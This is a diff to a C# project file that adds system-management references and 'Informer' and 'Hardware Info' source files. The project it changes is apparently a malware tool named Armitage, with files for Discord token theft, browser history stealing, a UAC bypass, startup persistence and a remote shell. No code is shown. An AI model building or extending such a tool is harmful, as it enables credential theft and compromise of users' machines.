@@ -46,6 +46,7 @@
     <Reference Include="Costura, Version=5.4.0.0, Culture=neutral, processorArchitecture=MSIL">
       <HintPath>..\packages\Costura.Fody.5.4.0-alpha0042\lib\netstandard1.0\Costura.dll</HintPath>
     </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="Microsoft.Win32.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
       <HintPath>..\packages\Microsoft.Win32.Primitives.4.3.0\lib\net46\Microsoft.Win32.Primitives.dll</HintPath>
     </Reference>
@@ -84,6 +85,7 @@
     <Reference Include="System.IO.FileSystem.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
       <HintPath>..\packages\System.IO.FileSystem.Primitives.4.3.0\lib\net46\System.IO.FileSystem.Primitives.dll</HintPath>
     </Reference>
+    <Reference Include="System.Management" />
     <Reference Include="System.Net.Http, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
       <HintPath>..\packages\System.Net.Http.4.3.0\lib\net46\System.Net.Http.dll</HintPath>
     </Reference>
@@ -124,6 +126,7 @@
     <Compile Include="Armitage\Cookies\Discord Token.cs" />
     <Compile Include="Armitage\Cookies\History Stealer.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
+    <Compile Include="Armitage\Informer.cs" />
     <Compile Include="Armitage\Shell\Command Types.cs" />
     <Compile Include="Armitage\Startup.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
@@ -155,6 +158,7 @@
     <Compile Include="Utilities\Converter.cs" />
     <Compile Include="Utilities\Encryptions And Decryptions.cs" />
     <Compile Include="Utilities\Files And Pathing.cs" />
+    <Compile Include="Utilities\Hardware Info.cs" />
     <Compile Include="Utilities\Icon Util.cs" />
     <Compile Include="Utilities\Process Utils.cs" />
     <Compile Include="Utilities\Ranging.cs" />
